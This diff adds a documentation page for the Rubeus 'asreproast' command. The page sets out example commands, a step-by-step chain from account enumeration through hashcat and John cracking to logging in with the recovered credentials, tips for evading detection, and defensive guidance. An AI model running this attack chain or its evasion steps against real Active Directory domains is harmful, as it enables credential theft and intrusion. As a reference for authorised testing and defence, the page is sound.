@@ -1,0 +1,319 @@
+---
+title: 'asreproast'
+description: 'Extract password hashes from accounts without Kerberos pre-authentication'
+icon: 'fire'
+sidebarTitle: 'asreproast'
+---
+
+## Overview
+
+AS-REP roasting attacks target user accounts that do not require Kerberos pre-authentication. This vulnerability allows attackers to request AS-REP responses containing encrypted data that can be cracked offline to recover plaintext passwords.
+
+## Syntax
+
+```bash
+Rubeus.exe asreproast [targeting] [options]
+```
+
+## Targeting Options
+
+<ParamField path="user" type="string">
+  Target specific username for AS-REP roasting
+</ParamField>
+
+<ParamField path="users" type="string">
+  File containing list of usernames to target
+</ParamField>
+
+<ParamField path="ou" type="string">
+  Target all users in specific organizational unit
+</ParamField>
+
+<ParamField path="domain" type="string">
+  Target domain (default: current domain)
+</ParamField>
+
+<ParamField path="dc" type="string">
+  Domain controller to target
+</ParamField>
+
+## Output Options
+
+<ParamField path="format" type="string">
+  Hash output format: john, hashcat (default: hashcat)
+</ParamField>
+
+<ParamField path="outfile" type="string">
+  Save extracted hashes to file
+</ParamField>
+
+<ParamField path="nowrap" type="boolean">
+  Don't wrap long lines in output
+</ParamField>
+
+## Examples
+
+<CodeGroup>
+```bash Basic AS-REP Roasting
+# Target specific user
+Rubeus.exe asreproast /user:victim
+
+# Target users from file
+Rubeus.exe asreproast /users:C:\temp\users.txt
+
+# Target entire domain
+Rubeus.exe asreproast /domain:corp.local
+```
+
+```bash Advanced Targeting
+# Target specific OU
+Rubeus.exe asreproast /ou:"OU=ServiceAccounts,DC=corp,DC=local"
+
+# Output to file in John format
+Rubeus.exe asreproast /format:john /outfile:hashes.txt
+
+# Target specific DC
+Rubeus.exe asreproast /dc:dc01.corp.local /nowrap
+```
+</CodeGroup>
+
+## Attack Methodology
+
+<Accordion title="Pre-Authentication Vulnerability">
+  **Security Mechanism:**
+  - Kerberos pre-authentication requires proof of password knowledge
+  - Prevents offline attacks by default
+  - Enabled for all accounts by standard policy
+  - Critical security control for authentication
+
+  **Vulnerability Condition:**
+  - "Do not require Kerberos preauthentication" flag set
+  - Often configured for compatibility reasons
+  - Legacy application requirements
+  - Misconfiguration or poor security practices
+</Accordion>
+
+<Accordion title="AS-REP Structure">
+  **Encrypted Component:**
+  - AS-REP contains user session key encrypted with user's password hash
+  - Encryption uses user's long-term key (NT hash)
+  - No salt or strong encryption by default
+  - Vulnerable to offline cracking attacks
+
+  **Crackable Format:**
+  - Hashcat mode 18200 (Kerberos 5, etype 23, AS-REP)
+  - John the Ripper krb5asrep format
+  - Standard dictionary and rule-based attacks
+  - GPU acceleration support
+</Accordion>
+
+## Target Discovery
+
+<Accordion title="LDAP Enumeration">
+  **Account Discovery:**
+  ```bash
+  # Discover vulnerable accounts via LDAP
+  # userAccountControl attribute with UF_DONT_REQUIRE_PREAUTH flag
+
+  # Target discovered accounts
+  Rubeus.exe asreproast /user:discovered_account
+  ```
+
+  **Organizational Unit Targeting:**
+  - Service account OUs often misconfigured
+  - Legacy application account containers
+  - Test account organizational units
+  - Bulk processing of suspected accounts
+</Accordion>
+
+<Accordion title="Integration with Discovery">
+  **Complete Workflow:**
+  ```bash
+  # 1. Use preauthscan to identify vulnerable accounts
+  Rubeus.exe preauthscan /users:all_users.txt
+
+  # 2. Target identified vulnerable accounts
+  Rubeus.exe asreproast /users:vulnerable_accounts.txt
+
+  # 3. Crack extracted hashes
+  hashcat -m 18200 hashes.txt wordlist.txt
+  ```
+</Accordion>
+
+## Hash Formats
+
+<Accordion title="Hashcat Format (Default)">
+  **Format Structure:**
+  ```bash
+  # Hashcat mode 18200
+  $krb5asrep$23$user@domain.local:hash_data_here
+
+  # Example output
+  $krb5asrep$23$victim@corp.local:3bb2b7e5e29c08c4c4e2d916d0e8d4c1$1a2b3c4d5e6f...
+  ```
+
+  **Cracking Command:**
+  ```bash
+  # GPU-accelerated cracking
+  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+
+  # With rules
+  hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule
+  ```
+</Accordion>
+
+<Accordion title="John the Ripper Format">
+  **Format Structure:**
+  ```bash
+  # John format
+  user:$krb5asrep$hash_data
+
+  # Example output
+  victim:$krb5asrep$23$victim@corp.local:hash_data_here
+  ```
+
+  **Cracking Command:**
+  ```bash
+  # John the Ripper cracking
+  john --format=krb5asrep asrep_hashes.txt
+
+  # With wordlist
+  john --format=krb5asrep --wordlist=rockyou.txt asrep_hashes.txt
+  ```
+</Accordion>
+
+## Operational Considerations
+
+<Accordion title="Success Rate Factors">
+  **Password Complexity:**
+  - Service accounts often have predictable passwords
+  - Legacy accounts may use weak passwords
+  - Default passwords in some environments
+  - Company-specific password patterns
+
+  **Account Types:**
+  - Service accounts (higher success rate)
+  - Legacy user accounts
+  - Test and development accounts
+  - Accounts with compliance exemptions
+</Accordion>
+
+<Accordion title="Detection and Noise">
+  **Authentication Logs:**
+  - AS-REQ requests appear in domain controller logs
+  - Failed pre-authentication events (4771)
+  - Unusual authentication patterns
+  - High-volume requests from single source
+
+  **Evasion Strategies:**
+  - Distribute requests across time
+  - Use multiple source systems
+  - Target during business hours
+  - Limit request frequency
+</Accordion>
+
+## Integration Workflows
+
+<Accordion title="Discovery to Exploitation">
+  **Complete Attack Chain:**
+  ```bash
+  # 1. Enumerate all domain users
+  # Use LDAP queries or other enumeration tools
+
+  # 2. Test for pre-auth requirement
+  Rubeus.exe preauthscan /users:domain_users.txt
+
+  # 3. Extract AS-REP hashes
+  Rubeus.exe asreproast /users:vulnerable_users.txt /outfile:hashes.txt
+
+  # 4. Crack hashes offline
+  hashcat -m 18200 hashes.txt wordlist.txt
+
+  # 5. Use recovered credentials
+  Rubeus.exe asktgt /user:cracked_user /password:recovered_password
+  ```
+</Accordion>
+
+<Accordion title="Targeted Approach">
+  **High-Value Focus:**
+  ```bash
+  # 1. Target specific high-value accounts
+  Rubeus.exe asreproast /user:serviceaccount
+
+  # 2. Extract hash if vulnerable
+  # Hash saved for offline cracking
+
+  # 3. Focus cracking efforts
+  hashcat -m 18200 single_hash.txt company_wordlist.txt
+
+  # 4. Immediate exploitation
+  Rubeus.exe asktgt /user:serviceaccount /password:cracked_password
+  ```
+</Accordion>
+
+## Defensive Considerations
+
+<Accordion title="Attack Prevention">
+  **Configuration Hardening:**
+  - Ensure pre-authentication required for all accounts
+  - Regular audit of userAccountControl attributes
+  - Monitor for accounts with UF_DONT_REQUIRE_PREAUTH flag
+  - Implement strong password policies
+
+  **Detection Mechanisms:**
+  - Monitor for 4771 events (failed pre-authentication)
+  - Alert on high-volume AS-REQ requests
+  - Track authentication patterns and anomalies
+  - Implement behavioral analysis
+</Accordion>
+
+<Accordion title="Remediation">
+  **Immediate Actions:**
+  - Enable pre-authentication for affected accounts
+  - Force password changes for vulnerable accounts
+  - Review and update account configurations
+  - Implement additional authentication controls
+
+  **Long-term Improvements:**
+  - Regular security assessments
+  - Automated configuration monitoring
+  - Enhanced password policies
+  - User and service account management procedures
+</Accordion>
+
+## Troubleshooting
+
+<Accordion title="Common Issues">
+  **No Vulnerable Accounts:**
+  - All accounts require pre-authentication
+  - Incorrect targeting or enumeration
+  - Insufficient domain access
+  - Network connectivity issues
+
+  **Extraction Failures:**
+  - Account lockout policies triggered
+  - Rate limiting by domain controllers
+  - Authentication failures
+  - Network or DNS issues
+</Accordion>
+
+<Accordion title="Optimization">
+  **Performance Improvements:**
+  - Use specific domain controllers
+  - Optimize request timing
+  - Batch process multiple accounts
+  - Parallel processing strategies
+
+  **Success Rate Enhancement:**
+  - Focus on service accounts
+  - Target legacy environments
+  - Use company-specific wordlists
+  - Implement hybrid attack strategies
+</Accordion>
+
+## Related Commands
+
+- [`preauthscan`](/commands/ticket-requests/preauthscan) - Discover vulnerable accounts
+- [`asktgt`](/commands/ticket-requests/asktgt) - Use cracked credentials
+- [`kerberoast`](/commands/roasting/kerberoast) - Alternative roasting technique
+- [`brute`](/commands/ticket-requests/brute) - Password bruteforce attacks
